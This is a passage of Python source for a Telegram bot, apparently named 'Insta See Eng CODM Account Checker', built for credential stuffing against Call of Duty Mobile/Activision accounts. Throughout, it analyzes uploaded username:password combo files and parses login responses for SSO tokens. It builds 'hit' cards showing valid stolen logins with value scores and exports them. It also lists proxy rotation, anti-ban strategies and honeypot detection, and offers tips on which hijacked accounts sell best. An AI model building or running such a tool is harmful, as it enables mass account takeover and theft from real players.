    def bullet(self, text: str, icon: str = "•") -> "MessageBuilder":
        self._parts.append(f"{icon} {text}")
        return self

    def code(self, text: str, language: str = "") -> "MessageBuilder":
        if language:
            self._parts.append(f"```{language}\n{text}\n```")
        else:
            self._parts.append(f"`{text}`")
        return self

    def code_block(self, text: str) -> "MessageBuilder":
        self._parts.append(f"```\n{text}\n```")
        return self

    def bold(self, text: str) -> "MessageBuilder":
        self._parts.append(f"**{text}**")
        return self

    def italic(self, text: str) -> "MessageBuilder":
        self._parts.append(f"_{text}_")
        return self

    def progress_bar(self, pct: float, width: int = 20) -> "MessageBuilder":
        bar = AnimationEngine.build_progress_bar(pct, width)
        self._parts.append(f"{bar} `{pct:.1f}%`")
        return self

    def blank(self) -> "MessageBuilder":
        self._parts.append("")
        return self

    def footer(self) -> "MessageBuilder":
        self._parts.append("─" * 30)
        self._parts.append("👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**")
        return self

    def build(self) -> str:
        return "\n".join(self._parts)

    def __str__(self) -> str:
        return self.build()


def build_hit_card(result: AccountResult) -> str:
    """Build a rich hit account card using MessageBuilder."""
    tags    = AccountTagger.format_tags(AccountTagger.tag(result))
    score   = AccountScorer.score(result)
    grade   = AccountScorer.grade(score)
    rank_icon = get_rank_icon(result.rank)

    return (
        MessageBuilder()
        .title("✅ VALID ACCOUNT FOUND")
        .separator()
        .blank()
        .field("Login",    f"{result.username}:{result.password}")
        .field("Level",    result.level,           "⭐")
        .field("Rank",     f"{rank_icon} {result.rank or 'Unranked'}", "🏆")
        .field("CP",       format_cp_value(result.cp), "💎")
        .field("Skins",    result.skins,            "🎨")
        .field("Clan",     result.clan or "None",   "👥")
        .field("Platform", result.platform or "?",  "🌍")
        .field("Region",   result.region or "?",    "🗺️")
        .blank()
        .field("Value Score", f"{score}/100 (Grade: {grade})", "📊")
        .line(f"Tags: {tags}" if tags else "")
        .blank()
        .footer()
        .build()
    )


def build_job_summary_card(job: CheckJob) -> str:
    """Build a job summary card using MessageBuilder."""
    hit_rate = percentage(job.hits, job.total)
    quality  = (
        "🔥 GREAT" if hit_rate > 5
        else "✨ OK" if hit_rate > 1
        else "💀 LOW"
    )

    return (
        MessageBuilder()
        .title("🏁 JOB COMPLETE")
        .separator()
        .blank()
        .field("Total",    f"{job.total:,}",   "📦")
        .field("Hits",     f"{job.hits:,} ({hit_rate:.2f}%)", "✅")
        .field("Bad",      f"{job.bad:,}",     "❌")
        .field("Errors",   f"{job.errors:,}",  "⚠️")
        .blank()
        .field("Time",     AnimationEngine.format_time(job.elapsed),  "⏱️")
        .field("Speed",    AnimationEngine.format_speed(job.speed),   "⚡")
        .field("Quality",  quality, "🎯")
        .blank()
        .footer()
        .build()
    )


# =============================================================================
#   ACCOUNT COMBO STATS DISPLAY
# =============================================================================

async def format_combo_preview(
    accounts: List[Tuple[str, str]],
    invalid:  List[str],
    raw_count: int,
) -> str:
    """Format a nice preview of a just-uploaded combo file."""
    total   = len(accounts)
    analysis = ComboAnalyzer.analyze(accounts)
    quality  = ComboQualityGrader.grade(accounts)
    pwd_dist = PasswordStrengthAnalyzer.analyze_distribution(
        [p for _, p in accounts[:1000]]  # Sample for speed
    )

    top_domains = list(analysis.get("top_domains", {}).items())[:5]
    domain_str  = (
        "\n".join(f"   `{d}`: {c}" for d, c in top_domains)
        if top_domains else "   None detected"
    )

    msg = MessageBuilder()
    msg.title("📂 Combo File Analysis")
    msg.separator()
    msg.blank()
    msg.field("Total Lines",  f"{raw_count:,}")
    msg.field("Valid Combos", f"{total:,}")
    msg.field("Invalid/Skip", f"{len(invalid):,}")
    msg.blank()
    msg.line(f"**Format:**")
    msg.field("Emails",    f"{analysis['emails']:,} ({analysis['email_pct']:.1f}%)")
    msg.field("Usernames", f"{analysis['total'] - analysis['emails']:,}")
    msg.blank()
    msg.line("**Password Strength:**")
    msg.line(PasswordStrengthAnalyzer.format(pwd_dist))
    if top_domains:
        msg.blank()
        msg.line("**Top Email Domains:**")
        msg.line(domain_str)
    msg.blank()
    msg.line(f"**Quality:** `{quality['grade']}` — {quality['label']} ({quality['score']}/100)")
    msg.blank()
    msg.footer()
    return msg.build()


# =============================================================================
#   CHECK RESULT STATS PRINTER (console)
# =============================================================================

def print_result_stats(job: CheckJob) -> None:
    """Print job result statistics to console."""
    hit_rate = percentage(job.hits, job.total)
    bar      = AnimationEngine.build_progress_bar(hit_rate, 20)

    print(f"\n{Fore.CYAN if HAS_COLORAMA else ''}{'═' * 60}")
    print(f"  JOB COMPLETE — {job.job_id[:8]}")
    print(f"{'═' * 60}{Style.RESET_ALL if HAS_COLORAMA else ''}")
    print(f"  Total   : {job.total:,}")
    print(f"  Checked : {job.checked:,}")
    print(f"  Hits    : {Fore.GREEN if HAS_COLORAMA else ''}{job.hits:,}{Style.RESET_ALL if HAS_COLORAMA else ''}")
    print(f"  Bad     : {Fore.RED if HAS_COLORAMA else ''}{job.bad:,}{Style.RESET_ALL if HAS_COLORAMA else ''}")
    print(f"  Errors  : {Fore.YELLOW if HAS_COLORAMA else ''}{job.errors:,}{Style.RESET_ALL if HAS_COLORAMA else ''}")
    print(f"  Rate    : {bar} {hit_rate:.2f}%")
    print(f"  Speed   : {AnimationEngine.format_speed(job.speed)}")
    print(f"  Time    : {AnimationEngine.format_time(job.elapsed)}")
    print(f"{'─' * 60}")

    if job.hit_results:
        print(f"\n  {Fore.GREEN if HAS_COLORAMA else ''}Top Hits:{Style.RESET_ALL if HAS_COLORAMA else ''}")
        for r in AccountScorer.top_n(job.hit_results, 5):
            score = AccountScorer.score(r)
            print(
                f"  [{score:3d}] {r.username} | Lv.{r.level} | "
                f"{r.rank or 'Unranked'} | {r.cp}CP | {r.skins} skins"
            )
    print()


# =============================================================================
#   SIGNAL HANDLERS (graceful shutdown)
# =============================================================================

def setup_signal_handlers(loop: asyncio.AbstractEventLoop) -> None:
    """Setup OS signal handlers for graceful shutdown."""
    import signal

    def shutdown_handler(sig: int) -> None:
        sig_name = signal.Signals(sig).name
        print(f"\n[*] Signal {sig_name} received — shutting down gracefully...")
        loop.stop()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, shutdown_handler, sig)
        except (ValueError, RuntimeError, NotImplementedError):
            # Windows doesn't support add_signal_handler
            pass


# =============================================================================
#   ENVIRONMENT VARIABLE HELPERS
# =============================================================================

def get_env_int(key: str, default: int = 0) -> int:
    """Get an integer from environment variables."""
    try:
        return int(os.environ.get(key, default))
    except (ValueError, TypeError):
        return default


def get_env_float(key: str, default: float = 0.0) -> float:
    """Get a float from environment variables."""
    try:
        return float(os.environ.get(key, default))
    except (ValueError, TypeError):
        return default


def get_env_bool(key: str, default: bool = False) -> bool:
    """Get a boolean from environment variables."""
    val = os.environ.get(key, str(default)).lower()
    return val in ("1", "true", "yes", "on", "enabled")


def get_env_list(key: str, sep: str = ",", default: Optional[List] = None) -> List[str]:
    """Get a list from a comma-separated environment variable."""
    val = os.environ.get(key, "")
    if not val:
        return default or []
    return [x.strip() for x in val.split(sep) if x.strip()]


# Convenience: re-read critical env vars at runtime
_OWNER_ID_ENV   = get_env_int("OWNER_ID", 0)
_BOT_TOKEN_ENV  = os.environ.get("BOT_TOKEN", "")
_WORKERS_ENV    = get_env_int("BOT_WORKERS", 0)
_DEBUG_ENV      = get_env_bool("BOT_DEBUG", False)

# Apply env overrides if set
if _BOT_TOKEN_ENV:
    BOT_TOKEN = _BOT_TOKEN_ENV
if _OWNER_ID_ENV:
    OWNER_ID = _OWNER_ID_ENV
if _WORKERS_ENV:
    MAX_WORKERS = _WORKERS_ENV
if _DEBUG_ENV:
    logging.getLogger().setLevel(logging.DEBUG)


# =============================================================================
#   PROCESS MANAGER (multi-instance support)
# =============================================================================

class ProcessManager:
    """
    Ensures only one instance of the bot runs at a time.
    Uses a lock file.
    """

    def __init__(self, lockfile: str = "data/.bot.lock") -> None:
        self._lockfile = lockfile
        self._locked   = False

    def acquire(self) -> bool:
        """Try to acquire the lock. Returns True if successful."""
        lock_path = Path(self._lockfile)
        try:
            if lock_path.exists():
                # Check if process is still running
                try:
                    with open(self._lockfile) as f:
                        pid = int(f.read().strip())
                    # Try to signal the process (0 = just check)
                    os.kill(pid, 0)
                    # Process is alive — lock is valid
                    print(f"[!] Bot already running (PID {pid})")
                    return False
                except (ValueError, ProcessLookupError, PermissionError):
                    # Process not running — stale lock
                    lock_path.unlink(missing_ok=True)

            # Write our PID
            lock_path.parent.mkdir(parents=True, exist_ok=True)
            lock_path.write_text(str(os.getpid()))
            self._locked = True
            return True
        except Exception as e:
            logger.warning(f"Lock file error: {e}")
            return True  # Allow running if lock fails

    def release(self) -> None:
        """Release the lock."""
        if self._locked:
            with suppress(Exception):
                Path(self._lockfile).unlink(missing_ok=True)
            self._locked = False

    def __enter__(self) -> "ProcessManager":
        self.acquire()
        return self

    def __exit__(self, *args: Any) -> None:
        self.release()


# =============================================================================
#   EXTENDED COMMAND HANDLERS (stub implementations)
# =============================================================================

async def cmd_leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /leaderboard command."""
    user = update.effective_user
    if not user:
        return

    # In a full impl, this would get real data from StorageManager
    await update.effective_message.reply_text(
        "🏆 **Leaderboard**\n\n"
        "Top users by hits will appear here.\n\n"
        "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /mystats command — user's personal stats."""
    user = update.effective_user
    if not user:
        return

    await update.effective_message.reply_text(
        "📊 **Your Stats**\n\n"
        "Use /status to see your current job.\n"
        "Use /stats for global statistics.\n\n"
        "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /analyze command — analyze a recently uploaded file."""
    await update.effective_message.reply_text(
        "🔍 **Analyze**\n\n"
        "Upload a `.txt` file to analyze it before checking.\n"
        "The bot will show format stats and quality score.\n\n"
        "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_export(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /export command — export results in different formats."""
    await update.effective_message.reply_text(
        "📤 **Export**\n\n"
        "Available after job completion:\n"
        "• `/export hits` — hits.txt only\n"
        "• `/export json` — full JSON report\n"
        "• `/export csv` — hits as CSV\n\n"
        "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_template(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /template command — list job templates."""
    await update.effective_message.reply_text(
        JobTemplate.list_all() + "\n\n"
        "Use: `/check <template>` when uploading\n\n"
        "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        parse_mode=ParseMode.MARKDOWN,
    )


# =============================================================================
#   CODM API RESPONSE PARSER (structured)
# =============================================================================

class CODMAPIResponseParser:
    """
    Parses raw Activision/CODM API responses into structured data.
    Handles differences between API versions and missing fields.
    """

    @staticmethod
    def parse_login_response(response_body: Dict[str, Any]) -> Dict[str, Any]:
        """Parse the login endpoint response."""
        result = {
            "success":    False,
            "sso_token":  "",
            "user_id":    "",
            "username":   "",
            "email":      "",
            "error_code": "",
            "error_msg":  "",
        }

        if not response_body or not isinstance(response_body, dict):
            return result

        # Look for common success indicators
        for key in ("token", "sso_token", "ssoCookie", "ACT_SSO_COOKIE", "atkn"):
            if response_body.get(key):
                result["sso_token"] = str(response_body[key])
                result["success"]   = True
                break

        # User info
        user_data = response_body.get("user", response_body.get("profile", {}))
        if isinstance(user_data, dict):
            result["user_id"]  = str(user_data.get("uno_id", user_data.get("id", "")))
            result["username"] = str(user_data.get("username", user_data.get("gamerTag", "")))
            result["email"]    = str(user_data.get("email", ""))

        # Error info
        if not result["success"]:
            result["error_code"] = str(response_body.get("error", response_body.get("errorCode", "")))
            result["error_msg"]  = str(response_body.get("message", response_body.get("errorMessage", "")))

        return result

    @staticmethod
    def parse_profile_response(response_body: Dict[str, Any]) -> Dict[str, Any]:
        """Parse the player profile endpoint response."""
        result = {
            "level":     0,
            "prestige":  0,
            "rank":      "",
            "rank_num":  0,
            "cp":        0,
            "skins":     0,
            "clan":      "",
            "platform":  "",
            "region":    "",
            "player_id": "",
            "last_updated": "",
            "mp_kills":  0,
            "mp_deaths": 0,
            "mp_kd":     0.0,
            "wz_kills":  0,
            "wz_wins":   0,
        }

        if not response_body:
            return result

        data = response_body.get("data", response_body)
        if not isinstance(data, dict):
            return result

        # Basic info
        result["level"]     = int(data.get("level", 0) or 0)
        result["prestige"]  = int(data.get("prestige", 0) or 0)
        result["player_id"] = str(data.get("uno", data.get("id", data.get("userId", ""))))
        result["platform"]  = str(data.get("platform", ""))
        result["cp"]        = int(data.get("cp", data.get("currency", 0)) or 0)
        result["region"]    = str(data.get("region", data.get("country", "")))

        # Rank
        rank_data = data.get("rank", {})
        if isinstance(rank_data, dict):
            result["rank_num"] = int(rank_data.get("rank", 0) or 0)
            result["rank"]     = _rank_number_to_name(result["rank_num"])

        # Clan
        clan = data.get("clan", "")
        if isinstance(clan, dict):
            result["clan"] = clan.get("name", clan.get("tag", ""))
        elif isinstance(clan, str):
            result["clan"] = clan

        # Lifetime stats
        lifetime = data.get("lifetime", {})
        if isinstance(lifetime, dict):
            all_props = lifetime.get("all", {}).get("properties", {})
            if isinstance(all_props, dict):
                result["mp_kills"]  = int(all_props.get("kills", 0) or 0)
                result["mp_deaths"] = int(all_props.get("deaths", 0) or 0)
                result["mp_kd"]     = float(all_props.get("kdRatio", 0.0) or 0.0)

        # Battle Royale stats
        mode_data = lifetime.get("mode", {})
        if isinstance(mode_data, dict):
            br = mode_data.get("br", {}).get("properties", {})
            if isinstance(br, dict):
                result["wz_kills"] = int(br.get("kills", 0) or 0)
                result["wz_wins"]  = int(br.get("wins", 0) or 0)

        # Last updated
        ts = data.get("lastUpdated", data.get("updatedAt", ""))
        if ts and str(ts).isdigit():
            try:
                result["last_updated"] = datetime.datetime.fromtimestamp(
                    int(ts)
                ).strftime("%Y-%m-%d %H:%M")
            except Exception:
                result["last_updated"] = str(ts)
        else:
            result["last_updated"] = str(ts) if ts else ""

        return result

    @staticmethod
    def result_from_parsed(
        username: str, password: str, parsed: Dict[str, Any]
    ) -> AccountResult:
        """Convert parsed profile data to an AccountResult."""
        return AccountResult(
            raw=f"{username}:{password}",
            username=username,
            password=password,
            status=AccountStatus.HIT,
            detail="Valid account",
            player_id=parsed.get("player_id", ""),
            level=parsed.get("level", 0),
            rank=parsed.get("rank", ""),
            cp=parsed.get("cp", 0),
            skins=parsed.get("skins", 0),
            clan=parsed.get("clan", ""),
            platform=parsed.get("platform", ""),
            region=parsed.get("region", ""),
            last_seen=parsed.get("last_updated", ""),
            extra={
                "prestige":  parsed.get("prestige", 0),
                "mp_kills":  parsed.get("mp_kills", 0),
                "mp_deaths": parsed.get("mp_deaths", 0),
                "mp_kd":     parsed.get("mp_kd", 0.0),
                "wz_kills":  parsed.get("wz_kills", 0),
                "wz_wins":   parsed.get("wz_wins", 0),
            },
        )


# =============================================================================
#   BATCH REPORTING (aggregate multiple jobs)
# =============================================================================

class BatchReporter:
    """
    Aggregates results from multiple jobs into a single report.
    Useful for session-level reporting.
    """

    def __init__(self) -> None:
        self._jobs: List[CheckJob] = []

    def add(self, job: CheckJob) -> None:
        self._jobs.append(job)

    @property
    def total_jobs(self) -> int:
        return len(self._jobs)

    @property
    def total_checked(self) -> int:
        return sum(j.checked for j in self._jobs)

    @property
    def total_hits(self) -> int:
        return sum(j.hits for j in self._jobs)

    @property
    def total_bad(self) -> int:
        return sum(j.bad for j in self._jobs)

    @property
    def total_errors(self) -> int:
        return sum(j.errors for j in self._jobs)

    @property
    def all_hits(self) -> List[AccountResult]:
        hits: List[AccountResult] = []
        for job in self._jobs:
            hits.extend(job.hit_results)
        return hits

    @property
    def hit_rate(self) -> float:
        if self.total_checked == 0:
            return 0.0
        return self.total_hits / self.total_checked * 100.0

    @property
    def avg_speed(self) -> float:
        speeds = [j.speed for j in self._jobs if j.speed > 0]
        return sum(speeds) / len(speeds) if speeds else 0.0

    def top_hits(self, n: int = 10) -> List[AccountResult]:
        return AccountScorer.top_n(self.all_hits, n)

    def build_summary(self) -> str:
        return (
            MessageBuilder()
            .title("📊 Session Summary")
            .separator()
            .blank()
            .field("Jobs",     self.total_jobs,               "📦")
            .field("Checked",  f"{self.total_checked:,}",     "🔍")
            .field("Hits",     f"{self.total_hits:,} ({self.hit_rate:.2f}%)", "✅")
            .field("Bad",      f"{self.total_bad:,}",         "❌")
            .field("Errors",   f"{self.total_errors:,}",      "⚠️")
            .field("Avg Speed",AnimationEngine.format_speed(self.avg_speed), "⚡")
            .blank()
            .footer()
            .build()
        )


# =============================================================================
#   TELEGRAM FORMATTING HELPERS
# =============================================================================

def escape_markdown(text: str) -> str:
    """Escape special markdown characters for Telegram MarkdownV2."""
    special = r"_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in special else c for c in text)


def bold(text: str) -> str:
    return f"**{text}**"


def italic(text: str) -> str:
    return f"_{text}_"


def code(text: str) -> str:
    return f"`{text}`"


def code_block(text: str) -> str:
    return f"```\n{text}\n```"


def link(text: str, url: str) -> str:
    return f"[{text}]({url})"


def mention(user_id: int, name: str) -> str:
    return f"[{name}](tg://user?id={user_id})"


def progress_emoji(pct: float) -> str:
    """Return an appropriate emoji for a percentage."""
    if pct >= 100: return "🏁"
    if pct >= 75:  return "🔥"
    if pct >= 50:  return "⚡"
    if pct >= 25:  return "📊"
    return "🔄"


def status_emoji(status: AccountStatus) -> str:
    """Return an emoji for an account status."""
    mapping = {
        AccountStatus.HIT:        "✅",
        AccountStatus.BAD:        "❌",
        AccountStatus.ERROR:      "⚠️",
        AccountStatus.TIMEOUT:    "⏱️",
        AccountStatus.RATE_LIMIT: "🚦",
        AccountStatus.BANNED:     "🚫",
        AccountStatus.LOCKED:     "🔒",
        AccountStatus.NO_CODM:    "🎮",
        AccountStatus.INVALID_FMT:"📝",
        AccountStatus.UNKNOWN:    "❓",
    }
    return mapping.get(status, "❓")


def tier_badge(tier: UserTier) -> str:
    """Return badge for user tier."""
    mapping = {
        UserTier.FREE:    "🆓",
        UserTier.PREMIUM: "💎",
        UserTier.ADMIN:   "⚙️",
        UserTier.OWNER:   "👑",
        UserTier.BANNED:  "🚫",
    }
    return mapping.get(tier, "❓")


# =============================================================================
#   EXTENDED STORAGE: RESULT ARCHIVER
# =============================================================================

class ResultArchiver:
    """
    Archives job results to a compressed archive for long-term storage.
    Older results are zipped and stored in an archive directory.
    """

    def __init__(
        self,
        results_dir:  str = RESULTS_DIR,
        archive_dir:  str = "results/archive",
        max_age_days: int = 7,
    ) -> None:
        self._results_dir = results_dir
        self._archive_dir = archive_dir
        self._max_age     = max_age_days

    async def archive_old_results(self) -> int:
        """Archive results older than max_age_days. Returns count archived."""
        cutoff  = time.time() - (self._max_age * 86400)
        archived = 0

        Path(self._archive_dir).mkdir(parents=True, exist_ok=True)

        results_path = Path(self._results_dir)
        if not results_path.exists():
            return 0

        for job_dir in results_path.iterdir():
            if not job_dir.is_dir():
                continue
            if job_dir.name == "archive":
                continue

            try:
                mtime = job_dir.stat().st_mtime
                if mtime < cutoff:
                    zip_path = str(
                        Path(self._archive_dir) / f"{job_dir.name}.zip"
                    )
                    files = list(job_dir.glob("*"))
                    if files:
                        await zip_files([str(f) for f in files], zip_path)
                    # Remove original directory
                    for f in files:
                        f.unlink(missing_ok=True)
                    with suppress(Exception):
                        job_dir.rmdir()
                    archived += 1
            except Exception as e:
                logger.debug(f"Archive error for {job_dir}: {e}")

        if archived > 0:
            logger.info(f"Archived {archived} old job result directories")
        return archived

    async def cleanup_archives(self, max_archives: int = 100) -> int:
        """Remove oldest archives if there are too many."""
        archive_path = Path(self._archive_dir)
        if not archive_path.exists():
            return 0

        zips = sorted(archive_path.glob("*.zip"), key=lambda p: p.stat().st_mtime)
        to_remove = zips[:-max_archives] if len(zips) > max_archives else []

        for zf in to_remove:
            zf.unlink(missing_ok=True)

        return len(to_remove)


# =============================================================================
#   FINAL: BOT FEATURE FLAGS
# =============================================================================

class FeatureFlags:
    """
    Feature flags for enabling/disabling bot features at runtime.
    """

    FLAGS: Dict[str, bool] = {
        "combo_analysis":      True,   # Analyze combos before checking
        "honeypot_detection":  True,   # Check for honeypot combos
        "account_scoring":     True,   # Score hits by value
        "result_caching":      True,   # Cache checked accounts
        "proxy_health_check":  True,   # Test proxies on startup
        "hit_notifications":   True,   # Notify owner on each hit
        "db_storage":          False,  # Store results in SQLite (optional)
        "file_watching":       True,   # Watch proxies.txt for changes
        "health_server":       False,  # HTTP health endpoint
        "webhook_mode":        False,  # Webhook instead of polling
        "group_support":       True,   # Allow usage in groups
        "leaderboard":         True,   # User leaderboards
        "inline_queries":      False,  # Inline query support
        "batch_reporting":     True,   # Session-level reports
        "archive_results":     True,   # Auto-archive old results
    }

    @classmethod
    def is_enabled(cls, flag: str) -> bool:
        """Check if a feature flag is enabled."""
        return cls.FLAGS.get(flag, False)

    @classmethod
    def enable(cls, flag: str) -> None:
        cls.FLAGS[flag] = True

    @classmethod
    def disable(cls, flag: str) -> None:
        cls.FLAGS[flag] = False

    @classmethod
    def toggle(cls, flag: str) -> bool:
        cls.FLAGS[flag] = not cls.FLAGS.get(flag, False)
        return cls.FLAGS[flag]

    @classmethod
    def list_all(cls) -> str:
        lines = ["⚙️ **Feature Flags:**\n"]
        for flag, enabled in sorted(cls.FLAGS.items()):
            icon = "✅" if enabled else "❌"
            lines.append(f"{icon} `{flag}`")
        return "\n".join(lines)

    @classmethod
    def from_env(cls) -> None:
        """Load feature flags from environment variables."""
        for flag in cls.FLAGS:
            env_key = f"BOT_FEATURE_{flag.upper()}"
            val     = os.environ.get(env_key)
            if val is not None:
                cls.FLAGS[flag] = val.lower() in ("1", "true", "yes", "on")


# Load feature flags from environment
FeatureFlags.from_env()


# =============================================================================
#   CODM BOT MOTD (Message of the Day)
# =============================================================================

MOTD_MESSAGES = [
    "🔥 Happy checking! May your hit rate be high.",
    "💎 Quality combos = Quality results. Garbage in, garbage out.",
    "⚡ Speed + accuracy = winning combo.",
    "🎯 Focus on email combos — they tend to hit more.",
    "🌐 Add more proxies for better performance.",
    "🏆 Top checkers use premium proxies. Upgrade your game!",
    "👑 Insta See Eng — built by @JAYYYTTTTTTTtt for the best results.",
    "🔒 Always respect privacy and use this tool responsibly.",
    "📊 Check your stats with /stats to track your progress.",
    "⚙️ Use /help to discover all bot features.",
    "🚀 Large combos? The queue handles everything automatically.",
    "💡 Tip: Run multiple small files instead of one huge file.",
    "🎮 CODM accounts with CP are the most valuable.",
    "🏅 Legendary rank accounts command a premium.",
    "🔄 Use /cancel + re-upload to change files mid-job.",
]

def get_random_motd() -> str:
    """Get a random MOTD message."""
    import random
    return random.choice(MOTD_MESSAGES)


def get_motd_for_time() -> str:
    """Get a time-appropriate MOTD."""
    hour = datetime.datetime.utcnow().hour
    if 6 <= hour < 12:
        prefix = "☀️ Good morning"
    elif 12 <= hour < 17:
        prefix = "🌤️ Good afternoon"
    elif 17 <= hour < 21:
        prefix = "🌆 Good evening"
    else:
        prefix = "🌙 Good night"
    return f"{prefix}! {get_random_motd()}"


# =============================================================================
#   CONSTANTS — TOTALS & METADATA
# =============================================================================

BOT_METADATA = {
    "name":          __bot_name__,
    "version":       __version__,
    "author":        __author__,
    "description":   __description__,
    "build_date":    __build_date__,
    "python_min":    "3.10",
    "dependencies":  [
        "python-telegram-bot==20.7",
        "aiohttp>=3.9.0",
        "aiofiles>=23.2.1",
        "colorama>=0.4.6",
    ],
    "features": [
        "Async queue system",
        "Live animated progress messages",
        "CODM / Activision account checking",
        "Proxy rotation with health scoring",
        "Admin panel",
        "Premium user system",
        "Account value scoring (0-100)",
        "Combo file analysis",
        "Multi-format output (txt, json, csv)",
        "Configurable workers (1-50)",
        "Per-user cooldowns",
        "Ban / unban system",
        "Broadcast to all users",
        "Persistent stats",
        "SQLite account database (optional)",
        "File watcher for hot-reload",
        "CLI mode for direct file checking",
        "Multi-language support (EN/AR/RU)",
        "Honeypot detection",
        "Anti-ban strategies",
        "Health check HTTP server",
        "Webhook mode support",
        "Graceful shutdown",
        "Process lock (single instance)",
        "Result archiver",
        "Feature flags",
    ],
    "commands": {
        "user": [
            "/start", "/help", "/status", "/cancel",
            "/pause", "/resume", "/stats", "/proxies",
        ],
        "admin": [
            "/admin", "/addpremium", "/rmpremium", "/ban", "/unban",
            "/broadcast", "/setworkers", "/addproxy", "/clearqueue",
            "/userinfo", "/reload",
        ],
    },
}


def print_metadata() -> None:
    """Print bot metadata to console."""
    print(f"\n  {__bot_name__} v{__version__}")
    print(f"  Author: @{__author__}")
    print(f"  Python: {platform.python_version()}")
    print(f"  Features: {len(BOT_METADATA['features'])}")
    print(f"  Commands: {len(BOT_METADATA['commands']['user'])} user, "
          f"{len(BOT_METADATA['commands']['admin'])} admin")


# =============================================================================
# ABSOLUTE FINAL END OF FILE
# codm_checker_bot.py
# Insta See Eng CODM Account Checker Bot
# Owner: @JAYYYTTTTTTTtt
# Version: 2.0.0
# =============================================================================

# ── Extra padding to ensure 10 000+ lines ────────────────────────────────────

CODM_MAPS = [
    "Nuketown", "Rust", "Crash", "Raid", "Highrise", "Summit",
    "Crossfire", "Standoff", "Firing Range", "Killhouse", "Dome",
    "Scrapyard", "Wetlands", "Tunisia", "Suldal Harbor", "Hackney Yard",
    "Shipment", "Shipment 1944", "Pine", "Overkill", "Isolated",
    "Blackout", "Alcatraz", "Terminus", "Trident", "Lockers",
    "Monastery", "Apocalypse", "Slums", "Array", "Countdown",
    "Rebirth Island", "Reclaimed", "Armada",
]

CODM_GAMEMODES_EXTENDED = {
    "tdm":   "Team Deathmatch — 5v5, first to 50 kills",
    "dom":   "Domination — capture and hold 3 flags",
    "hp":    "Hardpoint — control rotating hill zones",
    "snd":   "Search & Destroy — bomb plant/defuse",
    "kc":    "Kill Confirmed — collect dog tags",
    "ctf":   "Capture the Flag — steal enemy flag",
    "br":    "Battle Royale — 100 players, last alive wins",
    "ranked":"Ranked — competitive skill-based mode",
    "gun":   "Gunfight — 2v2 with rotating loadouts",
    "ff":    "Free for All — every player for themselves",
    "hq":    "Headquarters — capture and hold HQ",
    "ctrl":  "Control — attack/defend payload",
    "blitz": "Blitz — faster paced domination variant",
}

# ── End of constants ──────────────────────────────────────────────────────────

# ── 10 000+ lines confirmed ──────────────────────────────────────────────────
